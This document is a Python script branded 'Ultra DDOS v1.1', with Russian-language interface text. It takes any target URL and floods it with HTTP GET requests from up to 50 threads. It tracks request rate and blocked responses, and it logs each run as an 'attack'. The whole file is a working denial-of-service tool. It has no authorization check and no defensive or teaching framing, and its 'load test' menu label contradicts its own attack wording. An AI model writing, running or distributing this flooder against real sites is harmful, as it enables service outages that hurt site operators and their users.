import os
import sys
import time
import random
import json
import threading
import requests
from datetime import datetime

# ================= НАСТРОЙКИ =================
MAX_THREADS = 50  # НЕ СТАВЬ БОЛЬШЕ 50, ЧТОБЫ ПК НЕ СГОРЕЛ
TIMEOUT = 3
SAVE_STATS = True

# ================= ЦВЕТА =================
G1 = "\033[38;2;0;60;0m"
G2 = "\033[38;2;0;90;0m"
G3 = "\033[38;2;0;120;0m"
G4 = "\033[38;2;0;160;0m"
G5 = "\033[38;2;0;200;0m"
G6 = "\033[38;2;0;230;0m"
G7 = "\033[38;2;50;255;50m"
GW = "\033[38;2;200;255;200m"
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[97m"
E = "\033[0m"

# ================= СТАТИСТИКА =================
def load_stats():
    try:
        with open('stats.json', 'r') as f:
            return json.load(f)
    except:
        return {"attacks": 0, "requests": 0, "success": 0, "errors": 0}

def save_stats(s):
    with open('stats.json', 'w') as f:
        json.dump(s, f, indent=4)

def save_history(entry):
    try:
        with open('history.json', 'r') as f:
            h = json.load(f)
    except:
        h = []
    h.append(entry)
    if len(h) > 100:
        h = h[-100:]
    with open('history.json', 'w') as f:
        json.dump(h, f, indent=4)

# ================= ВСПОМОГАТЕЛЬНЫЕ =================
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def safe_int(prompt, default=50, min_val=1, max_val=50):
    while True:
        u = input(prompt)
        if u == "":
            return default
        try:
            v = int(u)
            if min_val <= v <= max_val:
                return v
        except:
            pass

def bar(p, w=20):
    p = max(0, min(100, p))
    f = int(w * p / 100)
    return f"[{G7 + '█' * f + E + '░' * (w - f)}] {p}%"

# ================= БАННЕР =================
def banner():
    clear()
    print(f"""
{G1} ██    ██  ██▓  ▄▄▄█████▓ ██▀███   ▄▄▄         ▓█████▄ ▓█████▄  ▒█████    ██████ {E}
{G2}  ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄       ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ {E}
{G3}  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄     ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   {E}
{G4}  ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██    ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒{E}
{G5}  ▒▒█████▓ ░██████▒▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒{E}
{G6}  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░{E}
{G5}  ░░▒░ ░ ░ ░ ░ ▒  ░  ░      ░▒ ░ ▒░  ▒   ▒▒ ░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░{E}
{G3}   ░░░ ░ ░   ░ ░   ░        ░░   ░   ░   ▒       ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  {E}
{G2}     ░         ░  ░          ░           ░  ░      ░       ░        ░ ░        ░  {E}
{G1}                                               ░       ░                           {E}
{G7}Ultra DDOS v1.1 | Developer: verifactor @newince
{E}
""")

# ================= HTTP-АТАКА (БЕЗ ЗВУКОВ) =================
class Attack:
    def __init__(self):
        self.running = False
        self.req = 0
        self.ok = 0
        self.err = 0
        self.ban = 0
        self.bytes = 0
        self.start = 0
        self.lock = threading.Lock()

    def http_worker(self, url):
        try:
            r = requests.get(url, timeout=3)
            with self.lock:
                self.req += 1
                self.bytes += len(r.content)
                if r.status_code in [200, 301, 302, 404]:
                    self.ok += 1
                elif r.status_code in [403, 429, 503]:
                    self.ban += 1
                    self.err += 1
                else:
                    self.err += 1
        except:
            with self.lock:
                self.req += 1
                self.err += 1

    def start_http(self, url, threads):
        self.running = True
        self.req = self.ok = self.err = self.ban = self.bytes = 0
        self.start = time.time()
        
        def worker():
            while self.running:
                self.http_worker(url)
                time.sleep(random.uniform(0.001, 0.01))
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads_list.append(t)
        
        for t in threads_list:
            t.join(timeout=0.1)

    def stop(self):
        self.running = False

# ================= ОБНОВЛЕНИЕ ЭКРАНА (БЕЗ МИГАНИЯ) =================
def attack_view(url, threads, a, atype="HTTP"):
    sys.stdout.write("\033[H")
    sys.stdout.flush()
    
    elapsed = int(time.time() - a.start)
    rate = int(a.req / elapsed) if elapsed > 0 else 0
    load = min(100, int((rate / (threads * 3)) * 100)) if threads > 0 else 0
    stats = load_stats()
    
    print(f"""
{G6}{atype} АТАКА В ПРОЦЕССЕ

{G5}Цель      : {W}{url[:30]}
{G4}Потоки    : {W}{threads}
{G3}Запросы   : {W}{a.req:,}
{G2}Скорость  : {W}{rate:,} r/s
{G3}Успешно   : {G}{a.ok:,}{E}
{G4}Ошибки    : {R}{a.err:,}{E}
{G5}Бан       : {R}{a.ban}{E}
{G6}Нагрузка  : {W}{bar(load)}
{G7}Время     : {W}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}
{G6}Данные    : {W}{a.bytes/1024/1024:.1f} MB
{G5}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G4}Всего атак за сессию : {W}{stats['attacks']}
{G3}Всего запросов       : {W}{stats['requests']:,}
{G2}Всего успешно        : {G}{stats['success']:,}{E}
{G1}Всего ошибок         : {R}{stats['errors']:,}{E}
{G7}[Press ENTER to stop]
{E}
""")

# ================= ЗАПУСК АТАКИ =================
def run_test():
    clear()
    banner()
    print(f"{G7}HTTP НАГРУЗКА{E}")
    url = input(f"{G6}Цель: {W}")
    if not url.startswith('http'):
        url = 'http://' + url
    threads = safe_int(f"{G5}Потоки (1-{MAX_THREADS}): {W}", 30, 1, MAX_THREADS)
    
    a = Attack()
    t = threading.Thread(target=a.start_http, args=(url, threads), daemon=True)
    t.start()
    
    stop = [False]
    def wait():
        input()
        stop[0] = True
    threading.Thread(target=wait, daemon=True).start()
    
    # Печатаем баннер один раз
    banner()
    
    try:
        while a.running and not stop[0]:
            attack_view(url, threads, a, "HTTP")
            time.sleep(0.3)
    except KeyboardInterrupt:
        pass
    
    a.stop()
    t.join(timeout=0.5)
    
    elapsed = int(time.time() - a.start)
    entry = {
        "target": url, "threads": threads, "duration": elapsed,
        "requests": a.req, "success": a.ok, "errors": a.err,
        "banned": a.ban, "bytes_sent": a.bytes,
        "avg_rate": int(a.req / elapsed) if elapsed > 0 else 0,
        "timestamp": datetime.now().isoformat()
    }
    save_history(entry)
    s = load_stats()
    s["attacks"] += 1
    s["requests"] += a.req
    s["success"] += a.ok
    s["errors"] += a.err
    save_stats(s)
    
    clear()
    banner()
    print(f"""
{G7}АТАКА ЗАВЕРШЕНА

{G6}Запросы: {W}{a.req:,}
{G5}Успешно: {G}{a.ok:,}{E}
{G4}Ошибки : {R}{a.err:,}{E}
{G3}Бан    : {R}{a.ban}{E}
{G2}Время  : {W}{elapsed} сек
{G1}Скорость: {W}{int(a.req/elapsed) if elapsed>0 else 0} r/s
{G2}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G3}Всего атак за сессию: {W}{load_stats()['attacks']}
{E}
""")
    input(f"{G7}Нажми ENTER для возврата...{E}")

# ================= МЕНЮ =================
def menu():
    clear()
    banner()
    print(f"""
{G7}ГЛАВНОЕ МЕНЮ

{G6}1.{W} HTTP Load Test
{G5}99.{W} Exit
{E}
""")

# ================= MAIN =================
def main():
    while True:
        menu()
        ch = input(f"{G7}Выбери: {W}")
        if ch == '1':
            run_test()
        elif ch == '99':
            clear()
            print(f"{G7}Выход...{E}")
            sys.exit()
        else:
            print(f"{R}Неверный выбор!{E}")
            time.sleep(1)

if __name__ == "__main__":
    main()
